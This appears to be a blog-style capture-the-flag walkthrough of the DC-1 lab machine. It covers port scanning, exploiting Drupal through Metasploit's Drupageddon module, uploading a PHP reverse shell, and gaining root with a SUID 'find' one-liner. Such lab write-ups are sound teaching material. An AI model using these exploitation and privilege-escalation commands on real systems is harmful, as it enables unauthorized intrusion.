@@ -1,0 +1,86 @@
+I"`<p>DC-1 was a simple and straightforward <code class="language-plaintext highlighter-rouge">CVE</code> based box. We find the server is hosting <code class="language-plaintext highlighter-rouge">Drupal CMS</code>. I saw that Drupal version had a CVE which allowed me drop a <code class="language-plaintext highlighter-rouge">webshell</code> in webserver. Priv sec to root by exploiting <code class="language-plaintext highlighter-rouge">find SUID binary</code>.</p>
+
+<h1 id="summery">Summery</h1>
+<ul>
+  <li>Portscan</li>
+  <li>Drupal Enumeration</li>
+  <li>Exploting drupal to get shell</li>
+  <li>Privilege Escalation by exploting SUID binary</li>
+  <li>Getting Root</li>
+  <li>Final Flag</li>
+</ul>
+
+<h1 id="portscan">Portscan</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>Nmap scan report for 192.168.1.12
+Host is up (0.00022s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+111/tcp open  rpcbind
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h1 id="drupal">Drupal</h1>
+<p>I visit the website. I find that server is running Drupal CMS. I don’t have any idea about drupal so I search online and findout <code class="language-plaintext highlighter-rouge">droopescan</code> tool. I installed it and run it.</p>
+
+<p>For installation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>pip <span class="nb">install </span>droopescan
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>After installation I run <code class="language-plaintext highlighter-rouge">droopescan</code>.</p>
+
+<p><img src="/assets/img/dc-1/droopescan.png" alt="droopescan" /></p>
+
+<h1 id="initial-shell">Initial Shell</h1>
+<p>From scan I find out some useful stuff but drupal version grab my attention.Then I findout exploits on <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>searchsploit drupal 7
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><img src="/assets/img/dc-1/searchsploit.png" alt="searchsploit" /></p>
+
+<p>I start metasploit and used the exploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>use exploit/multi/http/drupal_drupageddon
+set rhosts 192.168.1.12
+run
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/dc-1/meterpreter_shell.png" alt="meterpreter_shell" />
+In this way I have meterpreter session</p>
+<h2 id="flag-1">Flag 1</h2>
+<p>After getting shell I found <code class="language-plaintext highlighter-rouge">flag1.txt</code> 
+<img src="/assets/img/dc-1/flag1.png" alt="flag1" /></p>
+
+<h2 id="netcat-shell">Netcat Shell</h2>
+<p>Now I have meterpreter so tried to launch shell and run the commands but due to some reasons I am not able to run commands.
+<img src="/assets/img/dc-1/not_working_shell.png" alt="not working shell" />
+ The metasploit shell is not working so that I shift to netcat shell by uploading <code class="language-plaintext highlighter-rouge">php-reverse-shell</code>.</p>
+
+<p><img src="/assets/img/dc-1/upload_shell.png" alt="upload_shell" /></p>
+
+<p><img src="/assets/img/dc-1/nc-shell.png" alt="nc_shell" /></p>
+
+<h1 id="privsec-to-root">Privsec to Root</h1>
+
+<p>After some enumeration I noticed that <code class="language-plaintext highlighter-rouge">find</code> has SUID bit set, we can run the commands as root.
+With one simple command we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>/usr/bin/find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="se">\;</span> <span class="nt">-quit</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><img src="/assets/img/dc-1/root.png" alt="root" /></p>
+<h2 id="final-flag">Final Flag</h2>
+<p><img src="/assets/img/dc-1/finalflag.png" alt="finalflag" /></p>
+
+:ET
